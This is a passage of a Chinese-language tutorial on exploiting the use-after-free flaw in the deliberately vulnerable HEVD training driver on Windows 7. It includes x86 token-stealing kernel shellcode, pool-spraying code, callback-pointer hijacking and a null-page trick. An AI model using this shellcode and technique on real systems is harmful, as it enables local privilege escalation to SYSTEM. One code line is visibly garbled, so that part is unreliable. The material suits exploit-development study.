            nop
            nop
            pushad
            mov eax,fs:[124h]
            mov eax, [eax + 0x50]    // 找到_EPROOCESS
            mov ecx, eax
            mov edx, 4    // edx = system PID
            // 循环是为了获取system的_EPROCESS
        find_sys_pid:
            mov eax, [eax + 0xb8]
            sub eax, 0xb8    // 链表遍历
            cmp [eax + 0xb4], edx    // 根据PID判断是否为SYSTEM
            jnz find_sys_pid
            // 替换Token
            mov edx, [eax + 0xf8]
            mov [ecx + 0xf8], edx
            popad
            ret
        }
    }
一点小Tips:
    [+] ShellCode的原理其实不用太了解, 大多数时候你可以把它当作stdio.h提供给你的printf函数, 直接用就好
    [+] 堆栈的平衡建议采用调试解决.
##### 2.3.3: ShellCode的有效性的验证.
调试器无所不能(但是不能帮我找到女朋友…), 我们想要运行shellcode, 如何运行???.
在阅读了源码之后, 我们发现了一个幸福的代码片段.
    if (g_UseAfterFreeObject->Callback) {
                g_UseAfterFreeObject->Callback();
            }
g_UseAfterFreeObject是一个全局变量, 他的定义如下.
    PUSE_AFTER_FREE g_UseAfterFreeObject = NULL;
    typedef struct _USE_AFTER_FREE {
        FunctionPointer Callback;
        CHAR Buffer[0x54];
    } USE_AFTER_FREE, *PUSE_AFTER_FREE;
有趣, 如果我们能够篡改他的函数指针指向ShellCode地址. 那么我们就能在内核当中调用我们的shellcode. 接下来做一个小小的演示
Tips:
    这一部分有些小小的东西需要后面的东西. 请关注篡改函数指针. 其他的内容不会的假装自己会, 看了后面的再来理解前面的.
在未篡改之前, g_UseAfterFreeObject的结构长这样.
    dt HEVD!g_UseAfterFreeObject
    0x877deb58 
       +0x000 Callback         : 0x87815558     void  +ffffffff87815558
       +0x004 Buffer           : [84] 
在进行了一堆骚操作之后(我们后面的主要内容就是为了讲解这个地方的骚操作).
g_UseAfterFreeObject的结构长这样.
    dt HEVD!g_UseAfterFreeObject
    0x877deb58
       +0x000 Callback         : 0x001f1000     void  UAF_AFTER_FREE_EXP!ShellCode+0
       +0x004 Buffer           : [84]  "
这样的话, 我们就能够运行`shellcode`了, 提权成功如图.
#### 2.4: 执行一堆骚操作.
我们前面说过, 后面的内容主要是一堆骚操作. 来执行替换g_UseAfterFree函数指针的功能.
##### 2.4.1: 伪造能够利用的数据
USE AFTER FREE, 从这个名字来看是指在FREE状态后依然能够被使用. 有趣有趣. 那我们来关注一下FREE状态之后如何使用.
在我们从小到大的过程中. 我们知道POOL是动态分配的, 就像你永远不知道明天的巧克力是什么味道一样(当然作为一个单身狗, 明天也是没有巧克力的,
太凄凉了). 你永远也不知道下一块分配的POOL在那个位置.
Wait, 我们真的不知道吗??? 如果你有兴趣你可以在此处的paper找到相应的POOL分配和释放算法的相关解释. 在这里我直接给出结论.
    [+] 假设想要被分配的堆的大小是258. 操作系统会去选取最适合258(>=)的空闲堆位置来存放他.
我们来看一下我们的UAF(假设已经成功)POOL的大小. 我们申请一个和他一模一样的堆. 是不是有一定的概率使我们分配后的堆的刚好是这个地方呢.
答案是肯定的. 但是有一个问题. 一定的概率. 我们希望我们的利用代码能够更加的稳定. 假设此时操作一共有X个大小的空闲区域. 我们的概率是1/X,
分配两个是2/X, 不断增加.
    [+] n/X -- n是我们请求分配的POOL个数.
最终我们的代码如下.
    // 构造美好的数据
    PUSEAFTERFREE fakeG_UseAfterFree = (PUSEAFTERFREE)malloc(sizeof(FAKEUSEAFTERFREE));
    fakeG_UseAfterFree->countinter = ShellCode;
    RtlFillMemory(fakeG_UseAfterFree->bufffer, sizeof(fakeG_UseAfterFree->bufffer), 'A');
    // 喷射
    for (int i = 0; i CallBack) ==> if(NULL->CallBack) ==> if(0->CallBack)
随着思路的推理, 我们的嘴角逐渐浮现出笑容. windows 7 下, 我们可以对申请0地址, 并且填充相应的内容.
假设shellcode地址为0x00410000. 我们通过对0地址进行填充内容.
    00000000: 00410000 --> 指向shellcode地址
我们也能顺利执行我们的shellcode. ==> 此处引发了一个`空指针解引用`漏洞.
OK, 我们验证了这是一个不安全的补丁. 更安全的补丁应该类似于这样
    if(g_UseAfterFreeObject != NULL)
    {
        if(g_UseAfterFreeObject->CallBack)
        {
            g_UseAfterFreeObject->CallBack();
        }
    }
很遗憾的, 当我发现这个的时候, 发现创作者已经做了这样一个检测…
#### 3.2: 关于挖洞的探讨.
在进行这次学习之后, 我有一个小小的猜测. 是否存在可能性, 安全人员在进行uaf漏洞补丁的时候. 忽视了空指针解引用呢.
自己思考的比较简陋的方式:
    [+] 补充最新的补丁.
    [+] 阅读更新报告, 确定漏洞集
    [+] 编写IDAPy, 完成如下的功能.
        ==> 检索汇编代码. 确定搜选补丁函数当中的CMP个数.(如果小于2, 可以做重点分析)
        ==> 检索汇编代码, 确定相邻8 byte - 16byte范围(这个范围需要具体研究.). 是否同时存在两个CMP
#### 3.3: UAF漏洞利用的套路总结.
    [+] 原理: 分配的POOL为赋值为NULL, 导致后面可用.
    [+] 触发漏洞
    [+] 伪造数据(依赖于伪造数据实现shellcode运行)
    [+] 调用相关的函数进行堆喷射
    [+] CMD验证
#### 3.4: 实验结果验证
![ok
test](https://images.seebug.org/content/images/2019/03/29/1553848579000-blog_4.gif-w331s)
### 0x4: 相关链接.
  * sakura师傅的博客: 
  * 小刀师傅的博客: 
  * 本文exp地址:
  * 一个大大的博客: 
  * shellcode编写: 
* * *